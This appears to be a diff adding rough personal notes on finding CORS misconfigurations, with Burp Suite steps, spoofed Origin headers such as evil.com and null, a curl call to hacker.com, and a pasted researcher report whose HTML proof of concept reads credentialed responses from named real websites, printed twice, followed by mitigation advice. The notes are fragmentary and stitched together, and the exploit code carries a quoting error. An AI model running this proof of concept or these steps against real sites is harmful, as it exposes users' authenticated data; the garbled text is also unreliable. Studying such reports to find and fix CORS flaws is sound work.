@@ -1,2 +1,142 @@
 Access-Control-Allow-Methods: GET, HEAD, POST
   Access-Control-Allow-Credentials: true
+
+
+
+
+cors by checking response header
+
+Access-Control-Allow-Origin:https://any.com
+
+Access-Control-Allow-Credientials: true
+
+Access-Control-Allow-Origin:https: *
+
+
+https://tignl.eu/wp-json/oembed/1.0/embed?url=https%3A%2F%2Ftignl.eu%2Fondersteuning%2F  H "Origin:
+
+
+step
+
+any website xyz.com 
+
+search xyz.com and send to spider 
+
+click burp and search access-control-allow-origin: *
+
+send to repeater
+
+
+
+new header in request body
+
+Origin: http://evi.coom |* |null
+
+Origin: *
+
+Origin: null
+
+
+
+curl https://hacker.com -H "Origin: bing.com" -I
+
+
+
+
+The server may respond with:
+An Access-Control-Allow-Origin header in its response indicating which origin sites
+are allowed. For example:
+Access-Control-Allow-Origin: http://www.evil.com
+Access-Control-Allow-Origin: http://www.evil.com
+An error page if the server does not allow the cross-origin request :
+Request Blocked: The Same Origin Policy disallows reading the remote resource at
+http://www.site.com/. This can be
+fixed by moving the resource to the same domain or enabling CORS.
+Request Blocked: The Same Origin Policy disallows reading the remote resource at
+http://www.site.com/. This can be
+fixed by moving the resource to the same domain or enabling CORS.
+An Access-Control-Allow-Origin (ACAO) header with a wildcard that allows all
+domains:
+Access-Control-Allow-Origin: *
+Access-Control-Allow-Origin: *
+i made quick poc code for it
+----------------------------------------------------------------------------------------------------------------------------
+<!DOCTYPE html>
+<html>
+<body>
+<center>
+<h2>CORS POC Exploit</h2>
+<h3>Extract SID</h3>
+<div id="demo">
+<button type="button" onclick="cors()">Exploit</button>
+</div>
+<script>
+function cors() {
+var xhttp = new XMLHttpRequest();
+xhttp.onreadystatechange = function() {
+if (this.readyState == 4 && this.status == 200) {
+document.getElementById("demo").innerHTML = alert(this.responseText);
+}
+};
+xhttp.open("GET",”https://blog.monetha.io/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fblog.monetha.io%2Fhow-am-i-different-from-tokencard-tenx-monaco%2F”, true);
+xhttp.withCredentials = true;
+xhttp.send();
+}
+</script>
+</body>
+</html>
+----------------------------------------------------------------------------------------------------------------------------
+I placed this file to my server as cors.html
+
+I hope this will fix very soon
+
+Security Guidance :
+
+Ensure that URLs responding with Access-Control-Allow-Origin: * do not include any sensitive content or information that might aid attacker in further attacks.
+Allow only selected, trusted domains in the Access-Control-Allow-Origin header. Prefer whitelisting domains over blacklisting or allowing any domain (do not use * wildcard nor blindly return the Origin header content without any checks).
+Don’t rely only on the Origin header for Access Control checks. Browsers always send this header in CORS requests, but it may be spoofed outside the browser. Application level protocols should be used to protect sensitive data.
+
+Regards
+
+Shubham Maheshwari
+Security Researcher
+
+
+
+
+
+
+
+
+<!DOCTYPE html>
+<html>
+<body>
+<center>
+<h2>CORS POC Exploit</h2>
+<h3>Extract SID</h3>
+<div id="demo">
+<button type="button" onclick="cors()">Exploit</button>
+</div>
+<script>
+function cors() {
+var xhttp = new XMLHttpRequest();
+xhttp.onreadystatechange = function() {
+if (this.readyState == 4 && this.status == 200) {
+document.getElementById("demo").innerHTML = alert(this.responseText);
+}
+};
+xhttp.open("GET",”https://blog.monetha.io/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fblog.monetha.io%2Fhow-am-i-different-from-tokencard-tenx-monaco%2F”, true);
+xhttp.withCredentials = true;
+xhttp.send();
+}
+</script>
+</body>
+</html>
+
+
+
+
+
+
+
+
